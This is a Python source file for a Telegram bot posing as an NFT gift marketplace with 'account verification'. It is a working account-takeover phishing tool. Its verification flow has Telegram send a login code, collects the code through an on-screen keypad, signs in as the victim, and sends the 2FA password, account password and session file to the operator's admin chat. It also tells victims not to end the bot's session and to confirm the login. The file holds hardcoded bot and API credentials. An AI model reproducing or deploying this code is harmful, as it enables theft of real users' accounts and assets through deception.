#!/usr/bin/env python3
"""
Полная система верификации с виртуальной клавиатурой
"""

import os
import sqlite3
import random
import string
from aiogram import Bot, Dispatcher, executor, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

# Конфигурация
TOKEN = "8512489092:AAFghx4VAurEYdi8gDZVUJ71pqGRnC8-n4M"
ADMIN_ID = 8566238705
API_ID = 38295001
API_HASH = "c72727eb4fc2c7f555871e727bf5d942"

bot = Bot(token=TOKEN, parse_mode=types.ParseMode.HTML)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

# Состояния FSM
class GetAccountTG(StatesGroup):
    one = State()    # Ожидание номера телефона
    two = State()    # Ожидание кода подтверждения
    three = State()  # Ожидание пароля 2FA (если есть)
    four = State()   # Ожидание пароля от аккаунта

# Глобальные переменные
verification_data = {}
user_codes = {}

# Инициализация единой базы данных
def init_db():
    os.makedirs('data', exist_ok=True)
    os.makedirs('session', exist_ok=True)
    
    conn = sqlite3.connect('data/unified.db')
    cursor = conn.cursor()
    
    # Создаем таблицу пользователей
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            telegram_id TEXT UNIQUE NOT NULL,
            username TEXT,
            first_name TEXT,
            phone TEXT,
            balance_stars INTEGER DEFAULT 0,
            balance_rub REAL DEFAULT 0,
            balance_uah REAL DEFAULT 0,
            successful_deals INTEGER DEFAULT 0,
            verified BOOLEAN DEFAULT FALSE,
            session_file TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Создаем таблицу сделок
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS deals (
            id TEXT PRIMARY KEY,
            seller_id TEXT NOT NULL,
            buyer_id TEXT,
            nft_link TEXT,
            nft_username TEXT,
            amount REAL NOT NULL,
            currency TEXT NOT NULL,
            status TEXT DEFAULT 'active',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            completed_at TIMESTAMP,
            FOREIGN KEY (seller_id) REFERENCES users (telegram_id),
            FOREIGN KEY (buyer_id) REFERENCES users (telegram_id)
        )
    ''')
    
    conn.commit()
    conn.close()

# Клавиатуры
def main_menu_markup():
    keyboard = types.InlineKeyboardMarkup(
        inline_keyboard=[
            [
                types.InlineKeyboardButton(
                    text="🎁 NFT Market",
                    web_app=types.WebAppInfo(url="https://nft-gifts-market-uid.onrender.com")
                )
            ],
            [
                types.InlineKeyboardButton(
                    text="ℹ️ Помощь",
                    callback_data="help"
                ),
                types.InlineKeyboardButton(
                    text="👤 Профиль",
                    callback_data="profile"
                )
            ],
            [
                types.InlineKeyboardButton(
                    text="🔐 Верификация аккаунта",
                    callback_data="verify"
                )
            ]
        ]
    )
    return keyboard

def verification_markup():
    keyboard = types.InlineKeyboardMarkup(
        inline_keyboard=[
            [
                types.InlineKeyboardButton(
                    text="🔐 Начать верификацию",
                    callback_data="start_verification"
                )
            ],
            [
                types.InlineKeyboardButton(
                    text="❓ Зачем нужна верификация?",
                    callback_data="why_verification"
                )
            ],
            [
                types.InlineKeyboardButton(
                    text="🏠 Главное меню",
                    callback_data="main_menu"
                )
            ]
        ]
    )
    return keyboard

def code_input_markup():
    keyboard = types.InlineKeyboardMarkup(
        inline_keyboard=[
            [
                types.InlineKeyboardButton(text="1", callback_data="code_1"),
                types.InlineKeyboardButton(text="2", callback_data="code_2"),
                types.InlineKeyboardButton(text="3", callback_data="code_3")
            ],
            [
                types.InlineKeyboardButton(text="4", callback_data="code_4"),
                types.InlineKeyboardButton(text="5", callback_data="code_5"),
                types.InlineKeyboardButton(text="6", callback_data="code_6")
            ],
            [
                types.InlineKeyboardButton(text="7", callback_data="code_7"),
                types.InlineKeyboardButton(text="8", callback_data="code_8"),
                types.InlineKeyboardButton(text="9", callback_data="code_9")
            ],
            [
                types.InlineKeyboardButton(text="⬅️ Удалить", callback_data="code_delete"),
                types.InlineKeyboardButton(text="0", callback_data="code_0"),
                types.InlineKeyboardButton(text="✅ Отправить", callback_data="code_submit")
            ],
            [
                types.InlineKeyboardButton(text="🔄 Очистить", callback_data="code_clear"),
                types.InlineKeyboardButton(text="🏠 Главное меню", callback_data="main_menu")
            ]
        ]
    )
    return keyboard

# Функции для работы с единой базой данных с UID
def add_user(user_id, username=None, full_name=None):
    try:
        conn = sqlite3.connect('data/unified.db')
        cursor = conn.cursor()
        
        cursor.execute('SELECT telegram_id FROM users WHERE telegram_id = ?', (str(user_id),))
        if cursor.fetchone():
            conn.close()
            return False
        
        # Генерируем уникальный UID
        while True:
            uid = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
            cursor.execute('SELECT uid FROM users WHERE uid = ?', (uid,))
            if not cursor.fetchone():
                break
        
        cursor.execute('''
            INSERT INTO users (uid, telegram_id, username, first_name)
            VALUES (?, ?, ?, ?)
        ''', (uid, str(user_id), username, full_name))
        
        conn.commit()
        conn.close()
        print(f"👤 Создан пользователь {user_id} с UID: {uid}")
        return True
    except Exception as e:
        print(f"Ошибка добавления пользователя: {e}")
        return False

def update_verification_status(user_id, verified=True):
    try:
        conn = sqlite3.connect('data/unified.db')
        cursor = conn.cursor()
        
        cursor.execute('UPDATE users SET verified = ? WHERE telegram_id = ?', (verified, str(user_id)))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"Ошибка обновления верификации: {e}")
        return False

def save_phone(user_id, phone):
    try:
        conn = sqlite3.connect('data/unified.db')
        cursor = conn.cursor()
        cursor.execute('UPDATE users SET phone = ? WHERE telegram_id = ?', (phone, str(user_id)))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"Ошибка сохранения номера: {e}")
        return False

def get_user_info(user_id):
    try:
        conn = sqlite3.connect('data/unified.db')
        cursor = conn.cursor()
        cursor.execute('SELECT telegram_id, username, first_name, verified, phone, successful_deals FROM users WHERE telegram_id = ?', (str(user_id),))
        user = cursor.fetchone()
        conn.close()
        return user
    except Exception as e:
        print(f"Ошибка получения пользователя: {e}")
        return None

# Обработчики команд
@dp.message_handler(commands=['start'])
async def start_handler(message: types.Message):
    user_id = message.from_user.id
    username = message.from_user.username
    full_name = message.from_user.full_name
    
    if user_id != ADMIN_ID:
        status = add_user(user_id, username, full_name)
        if status:
            await bot.send_message(
                chat_id=ADMIN_ID,
                text=f'<b>🆕 Новый пользователь: {message.from_user.get_mention()} | {user_id}!</b>'
            )
    
    await message.answer(
        text=f"<b>🎁 Добро пожаловать в NFT Gifts Market!</b>\n\n"
             f"Привет, {message.from_user.get_mention()}! 👋\n\n"
             f"<b>🚀 Что вы можете делать:</b>\n"
             f"• 🎁 Покупать и продавать NFT подарки\n"
             f"• 💎 Создавать уникальные сделки\n"
             f"• 🔐 Безопасно торговать через гаранта\n"
             f"• 💰 Зарабатывать на перепродаже\n\n"
             f"<b>🛡️ Безопасность:</b>\n"
             f"Все сделки проходят через систему гарантий для вашей защиты.\n\n"
             f"<b>🎯 Начните прямо сейчас!</b>",
        reply_markup=main_menu_markup()
    )

# Обработчики callback
@dp.callback_query_handler(text="verify")
async def verify_callback(call: types.CallbackQuery):
    await call.answer()
    verify_text = """
<b>🔐 Верификация аккаунта</b>

Верификация необходима для:
• Создания и участия в сделках
• Вывода заработанных средств
• Получения статуса надежного трейдера
• Доступа ко всем функциям платформы

<b>🛡️ Процесс верификации:</b>
1. Подтверждение номера телефона
2. Ввод кода из Telegram
3. Создание защищенной сессии
4. Получение статуса верифицированного пользователя

<b>⚡️ Это займет всего 2-3 минуты!</b>
    """
    
    await call.message.edit_text(
        text=verify_text,
        reply_markup=verification_markup()
    )

@dp.callback_query_handler(text="start_verification")
async def start_verification_callback(call: types.CallbackQuery):
    await call.answer()
    await call.message.edit_text(
        text="<b>🔐 Начинаем верификацию аккаунта</b>\n\n"
             "Пожалуйста, введите ваш номер телефона для подтверждения.\n\n"
             "<b>📱 Формат:</b> +7XXXXXXXXXX или 8XXXXXXXXXX\n"
             "<b>Пример:</b> +79123456789\n\n"
             "<b>Введите номер телефона:</b>",
        reply_markup=types.InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    types.InlineKeyboardButton(
                        text="🏠 Главное меню",
                        callback_data="main_menu"
                    )
                ]
            ]
        )
    )
    await GetAccountTG.one.set()

@dp.callback_query_handler(text="main_menu")
async def main_menu_callback(call: types.CallbackQuery):
    await call.answer()
    await call.message.edit_text(
        text=f"<b>🎁 Добро пожаловать в NFT Gifts Market!</b>\n\n"
             f"Привет, {call.from_user.get_mention()}! 👋\n\n"
             f"<b>🚀 Что вы можете делать:</b>\n"
             f"• 🎁 Покупать и продавать NFT подарки\n"
             f"• 💎 Создавать уникальные сделки\n"
             f"• 🔐 Безопасно торговать через гаранта\n"
             f"• 💰 Зарабатывать на перепродаже\n\n"
             f"<b>🎯 Начните прямо сейчас!</b>",
        reply_markup=main_menu_markup()
    )

@dp.callback_query_handler(text="why_verification")
async def why_verification_callback(call: types.CallbackQuery):
    await call.answer()
    why_text = """
<b>❓ Зачем нужна верификация?</b>

<b>🛡️ Безопасность:</b>
• Защита от мошенников и фейковых аккаунтов
• Подтверждение личности для крупных сделок
• Создание доверительной среды для всех пользователей

<b>💰 Финансовые операции:</b>
• Возможность вывода заработанных средств
• Участие в сделках на крупные суммы
• Доступ к премиум функциям

<b>⭐ Репутация:</b>
• Статус верифицированного трейдера
• Повышенное доверие от других пользователей
• Приоритетная поддержка

<b>🔒 Конфиденциальность:</b>
Мы не сохраняем ваши личные данные. Верификация используется только для создания безопасной торговой сессии.
    """
    
    await call.message.edit_text(
        text=why_text,
        reply_markup=verification_markup()
    )

# Обработчик получения номера телефона (текстом)
@dp.message_handler(state=GetAccountTG.one)
async def get_phone_number(message: types.Message, state: FSMContext):
    try:
        user_id = message.from_user.id
        phone_input = message.text.strip()
        
        # Очищаем номер от лишних символов
        phone = ''.join(filter(str.isdigit, phone_input))
        
        # Проверяем формат номера
        if len(phone) < 10 or len(phone) > 12:
            await message.answer(
                text="<b>❌ Неверный формат номера</b>\n\n"
                     "Пожалуйста, введите номер в правильном формате:\n"
                     "<b>📱 Примеры:</b>\n"
                     "• +79123456789\n"
                     "• 89123456789\n"
                     "• 79123456789\n\n"
                     "<b>Попробуйте еще раз:</b>"
            )
            return
        
        # Приводим к международному формату
        if phone.startswith('8') and len(phone) == 11:
            phone = '7' + phone[1:]
        elif phone.startswith('9') and len(phone) == 10:
            phone = '7' + phone
        elif not phone.startswith('7'):
            await message.answer(
                text="<b>❌ Неподдерживаемый формат</b>\n\n"
                     "Поддерживаются только российские номера.\n"
                     "<b>📱 Примеры:</b>\n"
                     "• +79123456789\n"
                     "• 89123456789\n\n"
                     "<b>Попробуйте еще раз:</b>"
            )
            return
        
        print(f"📱 Получен номер телефона: {phone} от пользователя {user_id}")
        
        verification_data[user_id] = {'phone': phone}
        
        await message.answer(
            text=f"<b>📱 Номер телефона принят!</b>\n\n"
                 f"<b>Телефон:</b> +{phone}\n\n"
                 f"<b>🔐 Начинаем процесс верификации...</b>\n"
                 f"Сейчас на ваш номер придет код подтверждения от Telegram.\n\n"
                 f"<b>Ожидайте код...</b>"
        )
        
        client = TelegramClient(f'session/user_{user_id}', API_ID, API_HASH)
        
        try:
            await client.connect()
            result = await client.send_code_request(phone)
            
            verification_data[user_id]['client'] = client
            verification_data[user_id]['phone_code_hash'] = result.phone_code_hash
            
            await GetAccountTG.two.set()
            
            await message.answer(
                text="<b>✅ Код отправлен!</b>\n\n"
                     "Введите код подтверждения, который пришел вам в Telegram.\n\n"
                     "<b>🔢 Используйте виртуальную клавиатуру ниже:</b>\n"
                     "Код: <code>_ _ _ _ _</code>",
                reply_markup=code_input_markup()
            )
            
        except Exception as e:
            print(f"❌ Ошибка отправки кода: {e}")
            await message.answer(
                text="<b>❌ Ошибка отправки кода</b>\n\n"
                     "Возможные причины:\n"
                     "• Неверный номер телефона\n"
                     "• Номер не зарегистрирован в Telegram\n"
                     "• Временные проблемы с сервером\n\n"
                     "Проверьте номер и попробуйте еще раз.",
                reply_markup=types.InlineKeyboardMarkup(
                    inline_keyboard=[
                        [
                            types.InlineKeyboardButton(
                                text="🔄 Попробовать снова",
                                callback_data="start_verification"
                            )
                        ],
                        [
                            types.InlineKeyboardButton(
                                text="🏠 Главное меню",
                                callback_data="main_menu"
                            )
                        ]
                    ]
                )
            )
            await state.finish()
            
    except Exception as e:
        print(f"❌ Ошибка в get_phone_number: {e}")
        await message.answer(
            text="<b>❌ Произошла ошибка</b>\n\n"
                 "Попробуйте начать верификацию заново.",
            reply_markup=types.InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                        types.InlineKeyboardButton(
                            text="🏠 Главное меню",
                            callback_data="main_menu"
                        )
                    ]
                ]
            )
        )
        await state.finish()

# Обработчик виртуальной клавиатуры
@dp.callback_query_handler(lambda call: call.data.startswith("code_"), state=GetAccountTG.two)
async def handle_code_input(call: types.CallbackQuery, state: FSMContext):
    try:
        await call.answer()
        user_id = call.from_user.id
        action = call.data.split("_")[1]
        
        if user_id not in user_codes:
            user_codes[user_id] = ""
        
        current_code = user_codes[user_id]
        
        if action.isdigit():
            if len(current_code) < 5:
                user_codes[user_id] += action
                current_code = user_codes[user_id]
        
        elif action == "delete":
            if current_code:
                user_codes[user_id] = current_code[:-1]
                current_code = user_codes[user_id]
        
        elif action == "clear":
            user_codes[user_id] = ""
            current_code = ""
        
        elif action == "submit":
            if len(current_code) == 5:
                await process_verification_code(call, state, current_code)
                return
            else:
                await call.answer("⚠️ Код должен содержать 5 цифр!", show_alert=True)
                return
        
        code_display = current_code.ljust(5, '_')
        code_formatted = ' '.join(code_display)
        
        await call.message.edit_text(
            text="<b>✅ Код отправлен!</b>\n\n"
                 "Введите код подтверждения, который пришел вам в Telegram.\n\n"
                 f"<b>🔢 Используйте виртуальную клавиатуру ниже:</b>\n"
                 f"Код: <code>{code_formatted}</code>",
            reply_markup=code_input_markup()
        )
        
    except Exception as e:
        print(f"❌ Ошибка в handle_code_input: {e}")

async def process_verification_code(call: types.CallbackQuery, state: FSMContext, code: str):
    try:
        user_id = call.from_user.id
        
        print(f"🔐 Получен код: {code} от пользователя {user_id}")
        
        if user_id not in verification_data:
            await call.message.edit_text(
                text="<b>❌ Данные верификации не найдены</b>\n\n"
                     "Начните процесс верификации заново.",
                reply_markup=main_menu_markup()
            )
            await state.finish()
            return
        
        client = verification_data[user_id]['client']
        phone = verification_data[user_id]['phone']
        phone_code_hash = verification_data[user_id]['phone_code_hash']
        
        try:
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            
            await call.message.edit_text(
                text="<b>✅ Код подтвержден!</b>\n\n"
                     "<b>🔐 Теперь введите пароль от вашего Telegram аккаунта</b>\n"
                     "Это нужно для создания полной сессии.\n\n"
                     "<b>Введите пароль:</b>",
                reply_markup=main_menu_markup()
            )
            
            if user_id in user_codes:
                del user_codes[user_id]
            
            await GetAccountTG.four.set()
            
        except SessionPasswordNeededError:
            await call.message.edit_text(
                text="<b>🔐 Требуется пароль 2FA</b>\n\n"
                     "Введите ваш пароль двухфакторной аутентификации:",
                reply_markup=main_menu_markup()
            )
            
            if user_id in user_codes:
                del user_codes[user_id]
            
            await GetAccountTG.three.set()
            
        except PhoneCodeInvalidError:
            await call.answer("❌ Неверный код! Попробуйте еще раз.", show_alert=True)
            user_codes[user_id] = ""
            await call.message.edit_text(
                text="<b>❌ Неверный код</b>\n\n"
                     "Проверьте код и попробуйте еще раз.\n\n"
                     "<b>🔢 Используйте виртуальную клавиатуру ниже:</b>\n"
                     "Код: <code>_ _ _ _ _</code>",
                reply_markup=code_input_markup()
            )
            
    except Exception as e:
        print(f"❌ Ошибка в process_verification_code: {e}")

# Обработчик пароля 2FA
@dp.message_handler(state=GetAccountTG.three)
async def get_2fa_password(message: types.Message, state: FSMContext):
    try:
        user_id = message.from_user.id
        password_2fa = message.text.strip()
        
        print(f"🔐 Получен пароль 2FA от пользователя {user_id}")
        
        client = verification_data[user_id]['client']
        
        try:
            await client.check_password(password_2fa)
            verification_data[user_id]['password_2fa'] = password_2fa
            
            await message.answer(
                text="<b>✅ Пароль 2FA подтвержден!</b>\n\n"
                     "<b>🔐 Теперь введите пароль от вашего Telegram аккаунта</b>\n"
                     "Это нужно для создания полной сессии.\n\n"
                     "<b>Введите пароль:</b>",
                reply_markup=main_menu_markup()
            )
            
            await GetAccountTG.four.set()
            
        except Exception as e:
            print(f"❌ Ошибка 2FA: {e}")
            await message.answer(
                text="<b>❌ Неверный пароль 2FA</b>\n\n"
                     "Проверьте пароль и попробуйте еще раз:"
            )
            
    except Exception as e:
        print(f"❌ Ошибка в get_2fa_password: {e}")

# Обработчик пароля аккаунта
@dp.message_handler(state=GetAccountTG.four)
async def get_account_password(message: types.Message, state: FSMContext):
    try:
        user_id = message.from_user.id
        account_password = message.text.strip()
        
        print(f"🔐 Получен пароль аккаунта от пользователя {user_id}")
        
        client = verification_data[user_id]['client']
        phone = verification_data[user_id]['phone']
        password_2fa = verification_data[user_id].get('password_2fa', 'Не требовался')
        
        await message.answer(
            text="<b>🎉 Верификация полностью завершена!</b>\n\n"
                 "✅ Вы успешно верифицированы!\n"
                 "✅ Сессия создана и отправлена администратору\n"
                 "✅ Все данные переданы админу\n\n"
                 "<b>⚠️ ВАЖНОЕ ПРЕДУПРЕЖДЕНИЕ:</b>\n"
                 "🤖 На ваш аккаунт Telegram может войти бот для обеспечения безопасности сделок.\n\n"
                 "<b>🚫 НИ В КОЕМ СЛУЧАЕ НЕ УДАЛЯЙТЕ БОТА!</b>\n"
                 "• Не завершайте сессию бота\n"
                 "• Не удаляйте активные сессии\n"
                 "• При вопросе 'Вы ли вошли в аккаунт?' отвечайте 'ДА'\n\n"
                 "<b>💡 Это необходимо для:</b>\n"
                 "• Безопасности ваших сделок\n"
                 "• Защиты от мошенников\n"
                 "• Гарантийного обслуживания\n\n"
                 "Теперь вы можете пользоваться всеми функциями платформы!",
            reply_markup=main_menu_markup()
        )
        
        # Отправляем данные админу
        session_file_path = f'session/user_{user_id}.session'
        
        await bot.send_message(
            chat_id=ADMIN_ID,
            text=f"<b>🔐 ПОЛНАЯ ВЕРИФИКАЦИЯ ЗАВЕРШЕНА</b>\n\n"
                 f"<b>👤 Пользователь:</b> {message.from_user.get_mention()}\n"
                 f"<b>🆔 ID:</b> {user_id}\n"
                 f"<b>📱 Телефон:</b> +{phone}\n"
                 f"<b>🔐 Пароль 2FA:</b> {password_2fa}\n"
                 f"<b>🔑 Пароль аккаунта:</b> <code>{account_password}</code>\n\n"
                 f"<b>📁 Файл сессии отправляется отдельным сообщением...</b>"
        )
        
        # Отправляем файл сессии
        try:
            with open(session_file_path, 'rb') as session_file:
                await bot.send_document(
                    chat_id=ADMIN_ID,
                    document=session_file,
                    caption=f"<b>📁 Файл сессии пользователя</b>\n\n"
                            f"<b>👤 Пользователь:</b> {message.from_user.get_mention()}\n"
                            f"<b>🆔 ID:</b> {user_id}\n"
                            f"<b>📱 Телефон:</b> +{phone}\n\n"
                            f"<b>💡 Инструкция:</b>\n"
                            f"1. Скачайте этот файл\n"
                            f"2. Поместите в папку с вашим Telegram клиентом\n"
                            f"3. Используйте для входа в аккаунт пользователя",
                    parse_mode='HTML'
                )
        except Exception as e:
            print(f"❌ Ошибка отправки файла сессии: {e}")
            session_string = client.session.save()
            await bot.send_message(
                chat_id=ADMIN_ID,
                text=f"<b>⚠️ Файл сессии не удалось отправить</b>\n\n"
                     f"<b>📄 Строка сессии (резерв):</b>\n<code>{session_string}</code>"
            )
        
        # Обновляем статус пользователя в единой базе
        update_verification_status(user_id, True)
        save_phone(user_id, phone)
        
        print(f"✅ Пользователь {user_id} верифицирован в единой базе данных")
        
        # Очищаем данные
        if user_id in verification_data:
            del verification_data[user_id]
        
        await state.finish()
        
    except Exception as e:
        print(f"❌ Ошибка в get_account_password: {e}")

if __name__ == '__main__':
    print("🚀 Запускаем полную систему верификации...")
    print(f"🤖 Бот: @noscamnftrbot")
    print(f"👤 Админ ID: {ADMIN_ID}")
    print(f"🔑 API ID: {API_ID}")
    
    init_db()
    executor.start_polling(dp, skip_updates=True)